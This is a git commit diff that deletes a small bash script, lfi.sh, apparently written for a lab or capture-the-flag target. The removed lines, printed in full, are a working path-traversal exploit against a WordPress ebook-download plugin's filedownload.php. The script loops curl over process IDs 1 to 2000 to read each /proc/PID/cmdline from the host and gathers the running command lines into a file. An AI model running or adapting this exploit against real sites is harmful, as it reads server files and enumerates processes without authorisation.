67899c82b83bef99877c860c75332bf3bd7feeed
M4rdc0re <83950727+M4rdc0re@users.noreply.github.com>
2024-02-09 20:41:34 +0100

    Delete lfi.sh

--- lfi.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-# Author: Mardcore
-
-for i in $(seq 1 2000);
-  do curl http://10.10.10.10/wp-content/plugins/ebook-download/filedownload.php\?ebookdownloadurl=../../../../../../../../../proc/$i/cmdline | sed 's/cmdline/\n/g' | tail -n +4 | sed 's/<script>/\n/g' | head -n -1 >> proc;
-done
-
-cat proc | sed '/^ *$/d' > process
-rm proc
